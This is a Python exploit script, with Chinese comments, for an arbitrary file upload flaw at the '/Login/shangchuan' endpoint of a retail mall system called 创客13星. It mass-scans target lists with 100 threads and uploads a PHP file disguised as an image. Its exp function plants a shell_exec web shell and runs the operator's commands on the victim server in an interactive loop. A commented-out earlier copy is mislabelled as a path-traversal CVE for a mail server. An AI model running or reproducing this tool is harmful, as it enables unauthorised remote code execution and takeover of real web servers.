# import sys
# import argparse
# import requests
# import logging
# from multiprocessing.dummy import Pool
#
# requests.packages.urllib3.disable_warnings()
#
# # 设置日志记录
# logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
# logger = logging.getLogger(__name__)
#
#
# def banner():
#     banner = r"""
#      .----------------.  .----------------.  .----------------.  .----------------.  .-----------------. .----------------.  .----------------.
# | .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
# | |     ______   | || |  ____  ____  | || | _____  _____ | || |      __      | || | ____  _____  | || |  ___  ____   | || |  _________   | |
# | |   .' ___  |  | || | |_   ||   _| | || ||_   _||_   _|| || |     /  \     | || ||_   \|_   _| | || | |_  ||_  _|  | || | |_   ___  |  | |
# | |  / .'   \_|  | || |   | |__| |   | || |  | |    | |  | || |    / /\ \    | || |  |   \ | |   | || |   | |_/ /    | || |   | |_  \_|  | |
# | |  | |         | || |   |  __  |   | || |  | '    ' |  | || |   / ____ \   | || |  | |\ \| |   | || |   |  __'.    | || |   |  _|  _   | |
# | |  \ `.___.'\  | || |  _| |  | |_  | || |   \ `--' /   | || | _/ /    \ \_ | || | _| |_\   |_  | || |  _| |  \ \_  | || |  _| |___/ |  | |
# | |   `._____.'  | || | |____||____| | || |    `.__.'    | || ||____|  |____|| || ||_____|\____| | || | |____||____| | || | |_________|  | |
# | |              | || |              | || |              | || |              | || |              | || |              | || |              | |
# | '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
#  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'
#
#
#     """
#     print(banner)
#
#
# def main():
#     banner()
#     parser = argparse.ArgumentParser(description="aidenMAILD 邮件服务器 路径遍历漏洞(CVE-2024-32399)")
#     parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
#     parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')
#
#     args = parser.parse_args()
#     if args.url and not args.file:
#         poc(args.url)
#         # if poc(args.url):
#         #     exp(args.url)
#     elif args.file and not args.url:
#         url_list = []
#         with open(args.file, 'r', encoding='utf-8') as f:
#             for url in f.readlines():
#                 url_list.append(url.strip().replace('\n', ''))
#         mp = Pool(100)
#         mp.map(poc, url_list)
#         mp.close()
#         mp.join()
#     else:
#         logger.info(f"Usage:\n\t python3 {sys.argv[0]} -h")
#
#
# def poc(target):
#     payload = "/Login/shangchuan"
#     headers = {
#         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
#         "Accept-Encoding": "gzip,deflate,br,zstd",
#         "Accept-Language": "zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7",
#         "Cache-Control": "max-age=0",
#         "Connection": "keep-alive",
#         "Content-Length": "197",
#         "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundaryBP56KuZOdlY4nLGg",
#         "Sec-Fetch-Dest": "document",
#         "Sec-Fetch-Mode": "navigate",
#         "Sec-Fetch-Site": "none",
#         "Upgrade-Insecure-Requests": "1",
#         "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/126.0.0.0Safari/537.36",
#         "sec-ch-ua": "'Not/A)Brand';v='8','Chromium';v='126','GoogleChrome';v='126'",
#         "sec-ch-ua-mobile": "?0",
#         "sec-ch-ua-platform": "'Windows'",
#         "sec-fetch-user": "?1",
#     }
#     data = ('------WebKitFormBoundary03rNBzFMIytvpWhy\r\nContent-Disposition: form-data; name="file"; '
#             'filename="1.php"\r\nContent-Type: image/jpeg\r\n\r\n<?php phpinfo('
#             ');?>\r\n------WebKitFormBoundary03rNBzFMIytvpWhy--')
#     proxies = {
#         'http': 'http://127.0.0.1:8080',
#         'https': 'http://127.0.0.1:8080'
#     }
#     try:
#         res1 = requests.post(url= target + payload, data=data, headers=headers, verify=False)
#         if res1.status_code == 200 and 'ERROR' not in res1. text and 'ERROR' not in res1.text:
#             logger.info(f"[+] {target} 存在漏洞")
#             with open('chuankere.txt', 'a') as f:
#                 f.write(target + '\n')
#             return True
#         else:
#             logger.info(f"[-] {target} 不存在漏洞")
#             return False
#     except Exception as e:
#         logger.error(f"[-] {target} 连接失败")
#
#
# def exp(target):
#     pass
#
#
# if __name__ == '__main__':
#     main()

import sys
import argparse
import requests
import logging
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

# 设置日志记录
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def banner():
    banner = r"""
     .----------------.  .----------------.  .----------------.  .----------------.  .-----------------. .----------------.  .----------------.
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |     ______   | || |  ____  ____  | || | _____  _____ | || |      __      | || | ____  _____  | || |  ___  ____   | || |  _________   | |
| |   .' ___  |  | || | |_   ||   _| | || ||_   _||_   _|| || |     /  \     | || ||_   \|_   _| | || | |_  ||_  _|  | || | |_   ___  |  | |
| |  / .'   \_|  | || |   | |__| |   | || |  | |    | |  | || |    / /\ \    | || |  |   \ | |   | || |   | |_/ /    | || |   | |_  \_|  | |
| |  | |         | || |   |  __  |   | || |  | '    ' |  | || |   / ____ \   | || |  | |\ \| |   | || |   |  __'.    | || |   |  _|  _   | |
| |  \ `.___.'\  | || |  _| |  | |_  | || |   \ `--' /   | || | _/ /    \ \_ | || | _| |_\   |_  | || |  _| |  \ \_  | || |  _| |___/ |  | |
| |   `._____.'  | || | |____||____| | || |    `.__.'    | || ||____|  |____|| || ||_____|\____| | || | |____||____| | || | |_________|  | |
| |              | || |              | || |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'


    """
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="创客13星零售商城系统前台任意文件上传漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        logger.info(f"Usage:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/Login/shangchuan"
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip,deflate,br,zstd",
        "Accept-Language": "zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Content-Length": "197",
        "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundaryBP56KuZOdlY4nLGg",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/126.0.0.0Safari/537.36",
        "sec-ch-ua": "'Not/A)Brand';v='8','Chromium';v='126','GoogleChrome';v='126'",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "'Windows'",
        "sec-fetch-user": "?1",
    }
    data = ('------WebKitFormBoundaryBP56KuZOdlY4nLGg\r\nContent-Disposition: form-data; name="file"; '
            'filename="1.php"\r\nContent-Type: image/jpeg\r\n\r\n<?php phpinfo(); ?>\r\n------WebKitFormBoundaryBP56KuZOdlY4nLGg--')
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    try:
        res1 = requests.post(url=target + payload, data=data, headers=headers, verify=False, proxies=proxies)
        if res1.status_code == 200 and 'ERROR' not in res1. text and 'ERROR' not in res1.text:
            logger.info(f"[+] {target} 存在漏洞")
            with open('chuanke.txt', 'a') as f:
                f.write(target + '\n')
            return True
        else:
            logger.info(f"[-] {target} 不存在漏洞")
            return False
    except Exception as e:
        logger.error(f"[-] {target} 连接失败: {e}")
        return False

def exp(target):
    while True:
        cmd = input("请输入要执行的命令（输入 q 退出）：")
        if cmd == "q":
            logger.info("正在退出,请等候……")
            break
        try:
            payload = "/Login/shangchuan"
            headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Accept-Encoding": "gzip,deflate,br,zstd",
                "Accept-Language": "zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7",
                "Cache-Control": "max-age=0",
                "Connection": "keep-alive",
                "Content-Length": "197",
                "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundaryBP56KuZOdlY4nLGg",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/126.0.0.0Safari/537.36",
                "sec-ch-ua": "'Not/A)Brand';v='8','Chromium';v='126','GoogleChrome';v='126'",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "'Windows'",
                "sec-fetch-user": "?1",
            }
            data = ('------WebKitFormBoundaryBP56KuZOdlY4nLGg\r\nContent-Disposition: form-data; name="file"; '
                    'filename="1.php"\r\nContent-Type: image/jpeg\r\n\r\n<?php echo shell_exec("' + cmd + '"); ?>\r\n------WebKitFormBoundaryBP56KuZOdlY4nLGg--')
            proxies = {
                'http': 'http://127.0.0.1:8080',
                'https': 'http://127.0.0.1:8080'
            }
            res1 = requests.post(url=target + payload, data=data, headers=headers, verify=False)
            if res1.status_code == 200:
                import json
                response_data = json.loads(res1.text)
                file_path = response_data['data']['src']
                res2 = requests.get(url=target + file_path + f"?cmd={cmd}", verify=False)
                if res2.status_code == 200:
                    logger.info(res2.text)
                else:
                    logger.error(f"[-] 请求 {target} 失败")
            else:
                logger.error(f"[-] 请求 {target} 失败")
        except Exception as e:
            logger.error(f"[-] 请求 {target} 时发生错误: {e}")

if __name__ == '__main__':
    main()
